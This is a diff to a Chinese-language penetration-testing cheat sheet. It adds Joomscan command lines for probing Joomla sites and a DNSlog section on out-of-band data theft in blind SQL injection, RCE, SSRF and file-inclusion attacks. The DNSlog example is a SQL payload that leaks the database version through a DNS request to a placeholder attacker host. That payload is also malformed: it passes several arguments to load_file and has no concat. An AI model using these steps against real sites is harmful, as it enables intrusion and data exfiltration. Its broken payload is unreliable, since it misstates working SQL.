@@ -76,6 +76,29 @@ metasploit
 	+ 将目标主机192.168.16.59的3389转发到本地主机的7070端口：portfwd add -l 7070 -r 192.168.16.59 -p 3389
 	+ 端口转发成功后就可以从本地端口连接rdp：rdesktop 127.0.0.1:7070
 
+Joomscan
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- 介绍
+	+ Joomla security scanner可以检测Joomla整站程序搭建的网站是否存在文件包含、sql注入、命令执行等漏洞。
+- 使用方法
+	+ 默认检测：``joomscan -u www.example.com``
+	+ 组件检测：``joomscan -u www.example.com –ec``
+	+ 设置cookie：``joomscan -u www.example.com --cookie "test=demo;"``
+	+ 随机UA：``joomscan -u www.example.com -r``
+	+ 设置代理：``joomscan -u www.example.com --proxy http://127.0.0.1:8080``
+	
+dnslog
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- 利用场景
+	+ Sql-Blind
+	+ RCE
+	+ SSRF
+	+ RFI（Remote File Inclusion）
+- 原理
+	将dnslog平台中的特有字段payload带入目标发起dns请求，通过dns解析将请求后的关键信息组合成新的三级域名带出，在ns服务器的dns日志中显示出来。
+- 示例
+	+ ``select load_file('\\\\',version(),'.dnslog地址')``
+
 其它
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - AWVS
